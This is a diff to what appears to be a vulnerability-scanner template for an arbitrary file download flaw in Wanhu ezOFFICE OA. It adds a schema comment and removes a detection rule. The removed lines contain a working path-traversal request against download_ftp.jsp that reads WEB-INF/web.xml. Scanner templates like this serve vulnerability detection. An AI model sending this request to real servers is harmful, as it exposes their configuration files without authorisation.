@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wanhu-oa-download-ftp-file-read
 
 info:
@@ -9,11 +10,3 @@ info:
     app="万户网络-ezOFFICE"
   reference:
     - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_ftp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
-    expression: response.status == 200 && response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>') 
-expression: r0()
